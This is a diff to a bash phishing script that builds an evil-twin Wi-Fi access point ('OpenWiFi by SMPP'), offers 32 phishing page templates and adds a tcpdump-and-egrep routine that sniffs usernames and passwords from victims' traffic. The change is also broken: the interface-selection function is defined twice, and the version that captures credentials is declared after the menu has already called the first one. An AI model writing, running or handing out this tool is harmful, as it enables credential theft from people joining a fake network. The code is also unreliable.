@@ -21,10 +21,25 @@ start_fake_ap() {
     interface=$1
     echo "Starting fake AP on interface: $interface"
     # Set interface to monitor mode
-    airmon-ng start $interface
+    airmon-ng start $interface > /dev/null 2>&1
     # Start fake AP
     airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface &
     echo "Fake AP started. Waiting for victims to connect..."
+}
+
+# Function to select network interface
+select_interface() {
+    echo "Select network interface:"
+    interfaces=$(ifconfig -a | grep -oE "^[a-zA-Z0-9]+" | grep -v "lo")
+    select interface in $interfaces; do
+        if [ -n "$interface" ]; then
+            echo "Selected interface: $interface"
+            start_fake_ap "$interface"
+            break
+        else
+            echo "Invalid selection. Please try again."
+        fi
+    done
 }
 
 # Function to select a phishing template
@@ -78,14 +93,21 @@ menu() {
     if [[ $option == 33 ]]; then
         server="create"
         createpage
-        start
+        select_interface
     elif (( $option >= 1 && $option <= 32 )); then
         server=$(sed "${option}q;d" <<< "$serverlist")
-        start
+        use_template "$server"
+        select_interface
     else
         printf "\e[1;93m [!] Invalid option!\e[0m\n"
         menu
     fi
+}
+
+# Function to capture credentials
+capture_credentials() {
+    echo "Capturing credentials..."
+    tcpdump -i wlan0 -A -s0 port http or port https | egrep -i "username=|password=|user=|pass=|login=|usr=|pwd="
 }
 
 # Main script starts here
@@ -96,8 +118,21 @@ clear_terminal
 # Display the big welcome message
 big_welcome
 
-# Start the fake AP
-start_fake_ap "wlan0" # Replace "wlan0" with the appropriate interface name
+# Start the phishing menu
+menu
 
-# Select a phishing template
-select_template
+# Function to select network interface
+select_interface() {
+    echo "Select network interface:"
+    interfaces=$(ifconfig -a | grep -oE "^[a-zA-Z0-9]+" | grep -v "lo")
+    select interface in $interfaces; do
+        if [ -n "$interface" ]; then
+            echo "Selected interface: $interface"
+            start_fake_ap "$interface"
+            capture_credentials
+            break
+        else
+            echo "Invalid selection. Please try again."
+        fi
+    done
+}
